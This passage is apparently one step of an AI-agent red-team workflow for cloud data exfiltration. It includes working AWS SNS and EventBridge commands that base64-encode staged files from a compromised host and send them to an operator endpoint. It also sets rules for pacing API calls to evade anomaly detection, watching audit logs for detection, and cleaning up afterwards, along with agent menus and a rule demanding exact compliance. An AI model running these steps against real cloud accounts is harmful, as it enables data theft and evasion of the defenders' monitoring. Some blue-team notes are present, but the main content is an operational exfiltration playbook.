# - Function creation logged (CloudTrail CreateFunction / Azure Activity Log)
# - Function invocation logged (CloudWatch Logs / Application Insights / Cloud Logging)
# - Outbound network from serverless is logged in VPC Flow Logs (if VPC-attached)
# - Function code can be inspected by security team if discovered
# - Runtime environment may have security agents (AWS Lambda Extensions, runtime monitoring)

# SNS/SQS data tunneling (AWS) — encode data in message payloads
# Publisher (on compromised host):
aws sns publish --topic-arn {{topic_arn}} --message "$(base64 -w0 {{staged_file}})"
# Subscriber (operator endpoint):
# Operator's HTTPS endpoint receives SNS notification with encoded data

# EventBridge exfiltration — send data as custom events
aws events put-events --entries '[{
  "Source": "com.internal.processor",
  "DetailType": "ProcessingComplete",
  "Detail": "{\"data\": \"'$(base64 -w0 {{staged_file}})'\"}"
}]'
# EventBridge rule forwards to operator's API Gateway/Lambda
```

**Serverless Exfiltration Decision Matrix:**

| Serverless Service | Data Source | Trigger | Audit Trail | Detection Risk |
|-------------------|-----------|---------|-------------|----------------|
| AWS Lambda | S3, DynamoDB, RDS | HTTP/Event/Schedule | CloudWatch + CloudTrail | Medium |
| Azure Functions | Blob, CosmosDB, SQL | HTTP/Event/Timer | App Insights + Activity Log | Medium |
| GCP Cloud Functions | GCS, Firestore | HTTP/Event/Pub/Sub | Cloud Logging + Audit Log | Medium |
| AWS SNS/SQS | Message payload | Direct publish | CloudTrail + CloudWatch | Low-Medium |
| Azure Event Grid | Event payload | Direct publish | Activity Log | Low-Medium |

### 8. Transfer Execution & Monitoring

**Execute cloud transfers per prioritized data list:**

**Transfer Execution Rules:**
1. Use cloud credentials with minimum required permissions — avoid admin credentials for exfil
2. Pace cloud API calls to avoid rate limiting and anomaly detection
3. Monitor CloudTrail/Azure Monitor/Cloud Audit for detection triggers
4. Set short expiry on all generated tokens/SAS/signed URLs
5. Clean up all cloud resources created for exfiltration (functions, replication rules, policies)
6. Document every API call, resource change, and token generation

**Cloud Transfer Progress Table:**

| Transfer ID | Cloud Provider | Method | Source | Destination | Volume | Duration | API Calls | Detection Events | Status |
|------------|---------------|--------|--------|-------------|--------|----------|----------|-----------------|--------|
| CTX-001 | {{provider}} | {{method}} | {{source}} | {{dest}} | {{size}} | {{time}} | {{count}} | {{events}} | {{status}} |

**Cloud Resource Cleanup Checklist:**

| Resource | Type | Account/Subscription | Created | Cleaned Up | Verification |
|----------|------|---------------------|---------|-----------|-------------|
| {{resource_name}} | Lambda/Function/Policy/Role | {{account}} | {{timestamp}} | ✅/❌ | {{verify}} |

### 9. Document Findings

**Write findings under `## Cloud Exfiltration`:**

```markdown
## Cloud Exfiltration

### Cloud Channel Assessment
{{cloud_exfiltration_viability_matrix}}

### Cloud Exfiltration Transfers
{{transfer_log_with_all_attempts}}

### Cloud Resources Created (and Cleanup Status)
{{resource_creation_and_cleanup_log}}

### SaaS Exfiltration
{{saas_platform_exfil_documentation_or_N/A}}

### Cloud-to-Cloud Transfers
{{c2c_transfer_documentation_or_N/A}}

### Serverless Exfiltration
{{serverless_exfil_documentation_or_N/A}}

### Detection Assessment
- Cloud audit events generated: {{list}}
- CASB alerts triggered: {{list or none}}
- Cloud DLP matches: {{list or none}}
- Estimated detection risk per method: {{assessment}}
```

Update frontmatter metrics:
- `cloud_exfil_providers_used` with provider list
- `cloud_exfil_volume` with total data transferred via cloud
- `cloud_exfil_methods` with method list
- `cloud_exfil_resources_created` with count of resources created
- `cloud_exfil_resources_cleaned` with count of resources cleaned up

### 10. Present MENU OPTIONS

"**Cloud exfiltration completed.**

Summary: {{transfer_count}} cloud transfers executed across {{provider_count}} cloud providers.
Providers: {{provider_list}} | Methods: {{method_list}} | Total Volume: {{total_volume}}
Resources Created: {{created_count}} | Resources Cleaned: {{cleaned_count}} | Outstanding Cleanup: {{remaining_count}}
Detection Events: {{detection_count}} | SaaS Shares Created: {{share_count}}
Data Remaining: {{remaining_data_description_or_none}}

**Select an option:**
[A] Advanced Elicitation — Deep analysis of cloud audit trail exposure, CASB detection assessment, or cloud DLP policy analysis
[W] War Room — Red (cloud exfil reliability, cross-cloud transfer paths, serverless evasion) vs Blue (CloudTrail/Azure Monitor/Cloud Audit correlation, CASB alert review, cloud DLP match analysis, service principal anomaly detection)
[C] Continue — Proceed to Covert Channel Exfiltration (Step 7 of 10)"

#### Menu Handling Logic:

- IF A: Deep analysis — examine cloud audit trail for a specific exfil technique. Analyze: what CloudTrail/Azure Monitor events correlate this exfil? Would GuardDuty/Defender for Cloud flag it? Are the audit logs being forwarded to SIEM? What CASB rules would match? Can the cloud security team reconstruct the exfil timeline from logs alone? Process insights, ask user if they want to adjust approach, if yes iterate and redisplay menu, if no redisplay menu
- IF W: War Room — Red Team perspective: which cloud exfil method had the best throughput/stealth ratio? What data still needs exfil? Can serverless methods scale for remaining volume? Are cross-cloud transfers viable? Blue Team perspective: what CloudTrail events correlate the exfil? What CASB alerts fired? What GuardDuty/Defender findings were generated? What service principal anomalies exist? Can the cloud security team detect presigned URL generation? How visible are bucket policy changes? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to stepsCompleted, then read fully and follow: `./step-07-covert-channels.md`
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and Cloud Exfiltration section populated], will you then read fully and follow: `./step-07-covert-channels.md` to begin covert channel exfiltration.

---

## 🚨 SYSTEM SUCCESS/FAILURE METRICS

### ✅ SUCCESS:

- Cloud security controls (CASB, cloud DLP, audit logging, GuardDuty/Defender/SCC, SCPs, VPC Service Controls) assessed BEFORE any cloud exfiltration
- Cloud Exfiltration Viability Matrix presented for all cloud providers and SaaS platforms in scope
- AWS S3 techniques assessed: direct upload, presigned URLs, bucket policy manipulation, cross-account replication, Lambda-based exfil
- Azure Blob/Storage techniques assessed: AzCopy, SAS token generation, Azure Functions, Logic Apps
- GCP Cloud Storage techniques assessed: gsutil, signed URLs, Cloud Functions, Transfer Service
- SaaS platform exfiltration assessed: OneDrive/SharePoint, Google Drive, Dropbox/Box, Slack/Teams
- Cloud-to-cloud transfers evaluated for perimeter bypass advantage
- Serverless exfiltration options evaluated for reduced detection footprint
- Every cloud resource created for exfiltration documented with cleanup status
- Original resource policies saved before modification and restored after exfiltration
- Cloud audit trail exposure assessed per technique
- Transfer verification performed on all cloud-transferred data
- Findings appended to report under `## Cloud Exfiltration`

### ❌ SYSTEM FAILURE:

- Not assessing CASB/cloud DLP posture before attempting cloud exfiltration
- Modifying cloud resource policies (bucket policies, SAS tokens, IAM roles) without saving original state for rollback
- Not cleaning up cloud resources created for exfiltration (Lambda functions, replication rules, sharing links)
- Using admin-level cloud credentials when lower-privilege would suffice
- Not documenting cloud audit trail events generated by each technique
- Not evaluating serverless options for reduced detection footprint
- Generating long-lived tokens/SAS/signed URLs (>24 hours) without justification
- Not assessing SaaS external sharing policies before creating sharing links
- Treating cloud exfil as network exfil — cloud has fundamentally different audit characteristics
- Not rate-limiting cloud API calls to avoid throttling and anomaly detection
- Attempting network protocol or covert channel exfiltration in this step
- Proceeding without user selecting 'C' (Continue)

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. Every cloud provider assessed, every cloud resource documented and cleaned up, every audit trail exposure evaluated. Cloud exfiltration leaves permanent audit records — OPSEC discipline means minimizing the footprint, not eliminating it.
